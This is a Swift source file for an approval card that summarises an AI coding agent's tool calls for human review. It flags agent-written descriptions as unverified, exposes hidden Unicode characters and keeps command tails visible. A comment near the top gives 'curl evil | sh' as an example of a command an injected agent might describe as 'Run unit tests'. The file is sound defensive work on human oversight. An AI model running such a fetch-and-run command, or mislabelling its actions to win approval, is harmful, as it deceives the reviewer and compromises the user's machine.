import Foundation

/// One plain line saying what a tool call does, shown above the raw command on the approval card.
/// `fromAgent` marks text the agent wrote itself (Bash `description`): the card captions it "Claude says (unverified):",
/// because an injected agent could describe `curl evil | sh` as "Run unit tests". Everything else is derived
/// from the actual tool input, so it needs no caption. Never invents a reason.
public struct ApprovalIntent: Equatable {
    public static let maxLength = 100
    public let text: String
    public let fromAgent: Bool

    /// nil when there is nothing trustworthy and useful to say, or when the line would only repeat the raw detail
    /// (Edit/Write/Read/MultiEdit show their path as the detail already); the card then keeps its plain layout.
    public static func make(tool: String, input: [String: Any], home: String = NSHomeDirectory()) -> ApprovalIntent? {
        func str(_ k: String) -> String? {
            let s = clean(input[k] as? String ?? "")
            return s.isEmpty ? nil : s
        }
        func derived(_ t: String?) -> ApprovalIntent? { t.map { ApprovalIntent(text: cap($0), fromAgent: false) } }
        switch tool {
        case "Bash": return str("description").map { ApprovalIntent(text: cap($0), fromAgent: true) }
        case "NotebookEdit": return derived(str("notebook_path").map { "Edit notebook \(displayPath($0, home: home))" })
        case "WebFetch": return derived(str("url").flatMap(host(of:)).map { "Fetch \($0)" }) // no host, no claim
        case "WebSearch": return derived(str("query").map { "Search the web for \"\($0)\"" })
        case "Glob": return derived(str("pattern").map { "Find files matching \($0)" })
        case "Grep": return derived(str("pattern").map { "Search files for \"\($0)\"" })
        default: return nil // includes Edit/MultiEdit/Write/Read: the raw detail is already their path
        }
    }

    /// Scalars that can reorder, hide or fake text: C0/C1 controls, bidi controls, zero-width and invisible characters.
    static func isHidden(_ u: Unicode.Scalar) -> Bool {
        switch u.value {
        case 0x00...0x1F, 0x7F...0x9F, 0x061C, 0x180E, 0x200B...0x200F, 0x2028, 0x2029, 0x202A...0x202E,
             0x2060, 0x2066...0x2069, 0xFEFF: return true
        default: return false
        }
    }

    /// For intent text: strips hidden scalars (newlines and tabs become spaces) and collapses whitespace.
    static func clean(_ s: String) -> String {
        var out = String.UnicodeScalarView()
        for u in s.unicodeScalars {
            switch u.value {
            case 0x0A, 0x0D, 0x09, 0x2028, 0x2029: out.append(" ")
            default: if !isHidden(u) { out.append(u) }
            }
        }
        return String(out).split(separator: " ", omittingEmptySubsequences: true).joined(separator: " ")
    }

    /// For the raw command: hidden scalars are shown as `<U+202E>` instead of acting, so the reader sees them.
    /// Newlines and tabs stay as they are.
    public static func reveal(_ s: String) -> String {
        var out = ""
        for u in s.unicodeScalars {
            if u.value == 0x0A || u.value == 0x09 || !isHidden(u) { out.unicodeScalars.append(u) }
            else { out += String(format: "<U+%04X>", u.value) }
        }
        return out
    }

    static func cap(_ s: String) -> String { s.count > maxLength ? String(s.prefix(maxLength - 1)) + "…" : s }

    /// Path with the home dir as ~, at most `limit` characters: a long directory is middle-truncated with the filename
    /// kept; a filename too long for that is itself middle-truncated keeping its extension. Counts graphemes.
    static func displayPath(_ p: String, home: String, limit: Int = 60) -> String {
        var s = p
        if !home.isEmpty, home != "/", s == home || s.hasPrefix(home + "/") { s = "~" + s.dropFirst(home.count) }
        guard s.count > limit else { return s }
        let name = (s as NSString).lastPathComponent
        let dir = String(s.dropLast(name.count))
        let room = limit - name.count - 1 // for the "…" joining dir parts
        if room >= 8 {
            let head = String(dir.prefix(room / 2)), tail = String(dir.suffix(room - room / 2))
            return head + "…" + tail + name
        }
        // Filename alone is (nearly) the whole budget: drop the directory and shorten the name, keeping its extension.
        guard name.count > limit else { return name }
        let ext = (name as NSString).pathExtension
        let keepExt = ext.isEmpty || ext.count > 8 ? "" : "." + ext
        let stem = String(name.dropLast(keepExt.count))
        let budget = max(limit - keepExt.count - 1, 2)
        let head = String(stem.prefix(budget - budget / 2)), tail = String(stem.suffix(budget / 2))
        return head + "…" + tail + keepExt
    }

    /// Host of an http(s)-style URL, or nil when there is none to show.
    static func host(of url: String) -> String? {
        guard let h = URL(string: url)?.host, !h.isEmpty else { return nil }
        return h
    }

    /// What the card shows of the raw command, bounded to `maxRows` rows of `columns` characters: all of it when it
    /// fits, otherwise the first rows, a "…" row and the last rows, so a tail like `| sh` is always visible.
    /// `columns` is deliberately conservative (narrower than the card), and the view applies no line limit,
    /// so a narrower render can only add rows, never cut the tail.
    public static func preview(_ s: String, columns: Int = 40, maxRows: Int = 6) -> String {
        var rows: [String] = []
        for line in s.split(separator: "\n", omittingEmptySubsequences: false) {
            var rest = Substring(line)
            repeat { rows.append(String(rest.prefix(columns))); rest = rest.dropFirst(columns) } while !rest.isEmpty
        }
        guard rows.count > maxRows else { return s }
        let tail = max(maxRows / 3, 1), head = maxRows - tail - 1
        return (rows.prefix(head) + ["…"] + rows.suffix(tail)).joined(separator: "\n")
    }

    /// Keeps the head AND the tail of a long command for storage, so something like a trailing `| sh` is never cut off.
    public static func headTail(_ s: String, limit: Int = 800) -> String {
        guard s.count > limit else { return s }
        let tail = limit * 3 / 8
        return String(s.prefix(limit - tail)) + "\n…\n" + String(s.suffix(tail))
    }
}
